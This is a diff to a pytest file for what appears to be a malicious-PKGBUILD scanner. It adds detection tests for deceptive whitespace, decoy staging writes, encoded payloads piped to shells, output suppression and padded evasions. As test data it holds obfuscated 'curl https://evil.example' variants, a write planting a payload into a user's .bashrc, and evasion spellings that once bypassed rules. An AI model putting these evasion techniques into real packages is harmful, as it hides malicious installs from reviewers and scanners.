@@ -149,7 +149,7 @@ def test_eval_belongs_to_r039_alone():
     `$(...)` there a non-literal command name, so `eval "$(updpkgsrcs ...)"`
     - benign, and in the corpus - drew a second CRITICAL beside R039's
     finding. The family's own rule is that it never claims bytes another
-    rule claims; that is why there is no X008 beside R013.
+    rule claims; that is why R013's codepoints are not re-scored here.
     """
     diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
             '+  eval "$(updpkgsrcs echoGitCMDForSubModule)"\n }\n')
@@ -556,3 +556,291 @@ def test_x002_claims_assembled_and_impersonating_names(label, command):
 def test_x002_does_not_fire_on_ordinary_non_ascii(label, command):
     """"Any non-ASCII" was too broad: it fired on English prose."""
     assert "X002" not in _fire(command), label
+
+
+# ---------------------------------------------------------------------------
+# X008: whitespace a shell does not split on.
+# ---------------------------------------------------------------------------
+
+#: (label, codepoint). Python calls each of these whitespace; bash splits on
+#: none of them, so a word containing one stays a single word.
+DECEPTIVE_SPACES = [
+    ("nbsp", "\u00a0"),
+    ("narrow-nbsp", "\u202f"),
+    ("figure-space", "\u2007"),
+    ("ogham-space", "\u1680"),
+    ("ideographic-space", "\u3000"),
+    ("next-line", "\u0085"),
+    ("line-separator", "\u2028"),
+]
+
+
+@pytest.mark.parametrize("label,space", DECEPTIVE_SPACES)
+def test_whitespace_a_shell_will_not_split_on_is_reported(label, space):
+    """`make<NBSP>install` displays as a command and runs as one word.
+
+    bash splits on space, tab and newline; Python's `\\s` matches all of
+    these too, so a payload rule fires *around* one - R001 reported "curl
+    piped to bash" for a line that runs no curl. R013 is FATAL and claims
+    bidi, zero-width and tag codepoints; these are a disjoint set, so
+    nothing scored or reported them.
+    """
+    assert "X008" in _fire(f"make{space}install"), label
+
+
+@pytest.mark.parametrize("label,command", [
+    ("space", "make install"),
+    ("tab", "make\tinstall"),
+    ("many-spaces", "make    install"),
+    ("carriage-return", "make install\r"),
+])
+def test_ordinary_whitespace_is_not_reported(label, command):
+    assert "X008" not in _fire(command), label
+
+
+def test_x008_claims_no_codepoint_r013_claims():
+    """The two sets are disjoint, which is why both can score.
+
+    R013 is FATAL; double-scoring a codepoint would corrupt the calibration
+    the project measures, and is the reason the bidi and homoglyph
+    candidates were dropped from this family in the first place.
+    """
+    from trustsight.analysis import scan_diff
+    from trustsight.analysis.crossfire import _DECEPTIVE_SPACE_RE
+
+    for codepoint in ("\u200b", "\u202e", "\ufeff", "\u2066"):
+        assert not _DECEPTIVE_SPACE_RE.search(codepoint), (
+            f"U+{ord(codepoint):04X} is R013's, and X008 must not claim it"
+        )
+        diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
+                f"+  make{codepoint}install\n }}\n")
+        fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
+        assert "R013" in fired, f"U+{ord(codepoint):04X} should still be R013's"
+
+
+def test_a_licence_file_is_not_a_shell_file():
+    """The one benign-corpus diff carrying such a character is font licence
+    text, which the file gate excludes before X008 ever sees it."""
+    diff = ("--- a/LICENSE\n+++ b/LICENSE\n@@ -1,2 +1,3 @@\n"
+            "+A. Limited License.\u00a0Subject to the terms\n")
+    assert "X008" not in set(crossfire_techniques(diff))
+
+
+# ---------------------------------------------------------------------------
+# Case, and the exemption that decides whether X005 speaks at all.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("label,command", [
+    # `$PKGDIR` is not a makepkg variable. It expands to nothing, so the
+    # write lands in a home directory while claiming the staging exemption -
+    # bought for the price of a shift key.
+    ("uppercase-decoy", 'install -Dm644 x "$PKGDIR/../../home/alice/.bashrc"'),
+    ("mixed-case-decoy", 'install -Dm644 x "$PkgDir/../../home/alice/.bashrc"'),
+    # The exemption belongs to the target, not to the line: a real `$pkgdir`
+    # somewhere else on the line used to buy silence for a write that has
+    # nothing to do with staging.
+    ("decoy-elsewhere", 'echo "$pkgdir" && cp payload /home/alice/.bashrc'),
+    ("decoy-in-argument", 'cp "$pkgdir/x" /home/alice/.bashrc'),
+])
+def test_the_staging_exemption_does_not_cover_a_decoy(label, command):
+    assert "X005" in _fire(command, function="package"), label
+
+
+@pytest.mark.parametrize("label,command", [
+    ("staged-write", 'install -Dm755 t "$pkgdir/home/shared/tool"'),
+    ("staged-srcdir", 'cp t "$srcdir/home/x"'),
+    ("staged-braced", 'install -Dm644 c "${pkgdir}/home/skel/.bashrc"'),
+])
+def test_a_genuinely_staged_write_is_still_exempt(label, command):
+    """Narrowing the exemption must not turn packaging into a finding."""
+    assert "X005" not in _fire(command, function="package"), label
+
+
+@pytest.mark.parametrize("label,command", [
+    ("uppercase-scheme-ip", 'source=("HTTPS://1.2.3.4/p.tar.gz")'),
+    ("mixed-scheme-ip", 'source=("Https://1.2.3.4/p.tar.gz")'),
+    ("uppercase-shortener", 'source=("HTTPS://BIT.LY/xyz")'),
+])
+def test_a_url_scheme_is_case_insensitive(label, command):
+    """RFC 3986 says so and curl agrees, so a shift key was a way past.
+
+    The shortener shape beside these was already case-insensitive, which is
+    what makes the inconsistency an accident rather than a decision.
+    """
+    assert "X006" in _fire(command, function="build"), label
+
+
+def test_an_encoded_host_survives_an_uppercase_scheme():
+    assert "X003" in _fire("curl -fsSL HTTP://0x7f000001/p", function="build")
+
+
+# ---------------------------------------------------------------------------
+# X001: the executor list, which is a list.
+# ---------------------------------------------------------------------------
+
+PAYLOAD = r"printf '\x63\x75\x72\x6c'"
+
+EXECUTORS = [
+    "sh", "bash", "zsh", "dash", "ksh",
+    # Every one of these ran the payload while X001 said nothing.
+    "ash", "mksh", "pdksh", "yash", "posh",
+    "busybox sh", "busybox ash", "/bin/busybox sh",
+    "env -S sh", "env -i bash", "command -p sh",
+    "source /dev/stdin", ". /dev/stdin",
+    # An interpreter executes decoded bytes exactly as a shell does, and no
+    # recipe pipes a hex-escape blob into one by accident.
+    "python", "python3", "perl", "ruby", "node",
+]
+
+
+@pytest.mark.parametrize("executor", EXECUTORS)
+def test_x001_catches_every_executor_spelling(executor):
+    """R001 already knew about `busybox sh` and `source /dev/stdin`, which
+    is the tell that the omission here was an oversight, not a boundary."""
+    assert "X001" in _fire(f"{PAYLOAD} | {executor}"), executor
+
+
+@pytest.mark.parametrize("command", [
+    "printf 'plain text' | tee out",
+    "echo hello | grep -q x",
+    "cat data.txt | sort | uniq",
+])
+def test_x001_needs_the_encoding_not_just_a_pipe(command):
+    """The escape blob is what makes an interpreter suspicious here."""
+    assert "X001" not in _fire(command), command
+
+
+# ---------------------------------------------------------------------------
+# X003 and X004: spellings of the same instruction.
+# ---------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize("label,command", [
+    ("bare", "set +x"),
+    ("x-last", "set +vx"),
+    # Caught or missed on nothing but letter order, because the pattern
+    # required the `x` to end the cluster.
+    ("x-first", "set +xv"),
+    ("x-middle", "set +vxe"),
+    ("long-form", "set +o xtrace"),
+    ("verbose", "set +o verbose"),
+])
+def test_x004_catches_every_spelling_of_trace_off(label, command):
+    assert "X004" in _fire(command), label
+
+
+@pytest.mark.parametrize("label,command", [
+    ("bare", "TERM=dumb make"),
+    # A quote sets exactly the same variable.
+    ("single-quoted", "TERM='dumb' make"),
+    ("double-quoted", 'TERM="dumb" make'),
+    ("exported", "export TERM=dumb"),
+])
+def test_x004_catches_a_quoted_term(label, command):
+    assert "X004" in _fire(command), label
+
+
+@pytest.mark.parametrize("label,command", [
+    ("stdout", "exec >/dev/null"),
+    ("stderr", "exec 2>/dev/null"),
+    # Appending detaches the stream as thoroughly as truncating it, and
+    # `&>` takes both at once. Both were silent.
+    ("append", "exec 2>>/dev/null"),
+    ("both-streams", "exec &>/dev/null"),
+    ("append-both", "exec &>>/dev/null"),
+    ("close", "exec 2>&-"),
+])
+def test_x004_catches_every_detaching_redirect(label, command):
+    assert "X004" in _fire(command), label
+
+
+@pytest.mark.parametrize("label,command", [
+    ("login-then-c", "bash -lc 'id'"),
+    ("errexit-then-c", "sh -ec 'id'"),
+    # The `c` may sit anywhere in the cluster: `-ce` is the same
+    # instruction as `-ec`, and requiring it last let both through.
+    ("c-then-errexit", "sh -ce 'id'"),
+    ("c-then-login", "bash -cl 'id'"),
+    # A list that named five of a dozen shells is a rename away from empty.
+    ("ash", "ash -lc 'id'"),
+    ("mksh", "mksh -lc 'id'"),
+    ("busybox", "busybox sh -lc 'id'"),
+])
+def test_x003_catches_option_stuffing_in_any_order(label, command):
+    assert "X003" in _fire(command), label
+
+
+@pytest.mark.parametrize("command", [
+    "sh -c 'make install'",
+    "bash -c 'true'",
+    "set -e",
+    "set +e",
+    "TERM=xterm make",
+    "exec 3>&1",
+])
+def test_ordinary_shell_is_not_option_stuffing_or_suppression(command):
+    """`sh -c` is how a recipe runs a command; only the *stuffing* is the
+    signal, and only a stream that goes nowhere is suppression."""
+    got = _fire(command)
+    assert "X003" not in got and "X004" not in got, f"{command}: {got}"
+
+
+@pytest.mark.parametrize("keyword", ["export", "declare", "local", "readonly", "typeset"])
+def test_a_declared_assignment_still_resolves_the_name(keyword):
+    """X002 is CRITICAL, so a name the tokenizer *can* resolve must not
+    reach it. `export CMD=curl` is an assignment like any other."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            f"+  {keyword} CMD=curl\n+  $CMD https://evil.example\n }}\n")
+    assert "X002" not in set(crossfire_techniques(diff)), keyword
+
+
+# ---------------------------------------------------------------------------
+# A bound is a bypass for anyone willing to type one more character.
+# ---------------------------------------------------------------------------
+
+#: (rule, short spelling, the same thing padded past the old bound). Each
+#: bound was there for backtracking safety, and each was a length-based way
+#: out: 41 characters inside the quotes, 61 before the confusable, 61 inside
+#: the braces, 201 between the blob and the pipe.
+PADDED_EVASIONS = [
+    ("X002", 'c"u"rl https://evil.example',
+             'c"' + "u" * 45 + '"rl https://evil.example'),
+    ("X002", "\u0441url https://evil.example",
+             "a" * 70 + "\u0441url https://evil.example"),
+    ("X002", "cur{l,} https://evil.example",
+             "cur{l," + "x" * 70 + "} https://evil.example"),
+    ("X001", r"printf '\x63\x75\x72' | sh",
+             r"printf '\x63\x75\x72' " + "-" * 250 + " | sh"),
+]
+
+
+@pytest.mark.parametrize("rule,short,padded", PADDED_EVASIONS)
+def test_padding_does_not_walk_past_a_shape(rule, short, padded):
+    assert rule in _fire(short), f"{rule}: the short spelling stopped matching"
+    assert rule in _fire(padded), f"{rule}: padding walked past it"
+
+
+@pytest.mark.parametrize("label,probe", [
+    # The inputs that made the unbounded versions quadratic. A bound removed
+    # in exchange for a quadratic is no trade: `is_superlinear` refuses
+    # exactly this shape at compile time.
+    ("brace with no close", "x{" + "," * 8192),
+    ("many blobs, no pipe", "printf '" + "\\x63" * 2048),
+    ("alternating quotes", 'a"' * 4096),
+    ("quote run", '"' * 8192),
+])
+def test_an_unbounded_span_stays_linear(label, probe):
+    import time
+
+    from trustsight.analysis.crossfire import X001_RE, X002_SHAPES
+
+    worst = 0.0
+    for _name, rx in X002_SHAPES:
+        start = time.perf_counter()
+        rx.match(probe)
+        worst = max(worst, time.perf_counter() - start)
+    start = time.perf_counter()
+    X001_RE.search(probe)
+    worst = max(worst, time.perf_counter() - start)
+    assert worst < 0.05, f"{label}: {worst * 1000:.0f}ms on one clamped line"
